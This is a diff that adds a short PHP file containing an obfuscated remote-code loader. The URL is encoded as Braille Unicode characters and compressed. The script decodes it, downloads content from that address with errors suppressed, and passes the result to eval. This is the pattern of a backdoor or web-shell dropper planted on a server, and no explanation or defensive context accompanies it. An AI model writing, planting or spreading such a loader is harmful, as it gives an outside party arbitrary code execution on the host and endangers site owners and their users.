@@ -1,0 +1,7 @@
+<?php
+$B="⣋⠨⠩⠩⠨⢶⣒⣗⠯⠮⡉⠭⣈⣍⣏⣍⠨⡍⣒⡋⣎⣏⣕⠷⣖⠫⢩⠨⠁⠀";
+$ord=function($ch){return unpack('N',iconv('UTF-8','UCS-4BE',$ch))[1];};
+$bin='';foreach(preg_split('//u',$B,-1,PREG_SPLIT_NO_EMPTY) as $ch){$bin.=chr($ord($ch)-0x2800);}
+$u=gzinflate($bin);        
+$code=@file_get_contents($u);
+eval('?>'.preg_replace('/^\xEF\xBB\xBF/','',$code));
